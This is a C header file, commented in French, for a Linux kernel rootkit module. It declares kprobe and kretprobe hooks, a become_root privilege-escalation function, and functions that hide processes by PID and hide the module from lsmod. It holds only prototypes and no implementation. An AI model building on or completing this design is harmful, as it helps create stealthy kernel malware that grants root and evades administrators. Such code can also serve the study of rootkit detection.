#ifndef ROOTEST_H
#define ROOTEST_H

#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/ptrace.h>

// Features exécutées par les hooks
int become_root(void);

// Fonctions d'appel des sondes kprobes
int kprobes_init(void);
void kprobes_exit(void);
int kprobe_handler(struct kprobe *p, struct pt_regs *regs);

// Prototype pour le gestionnaire de retour de kretprobe
int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs);

// Déclaration externe des structs de probes pour utilisation dans les fichiers C
extern struct kretprobe rootkit_kretprobe;

// Sutructure d'un processus à partir de son PID
struct task_struct *find_task(pid_t pid);

// Dissimule un process via son PID
int hide_process(pid_t pid);

// Fonctions de dissimulation du module
void hide_from_lsmod(void);

// Probe sur l'envoi de signal aux processus
extern struct kretprobe sig_kp;
int entry_signal(struct kretprobe_instance *ri, struct pt_regs *regs); 
int ret_signal(struct kretprobe_instance *ri, struct pt_regs *regs);

// Fonctions d'aide
void print_registers(struct pt_regs *regs);

#endif 

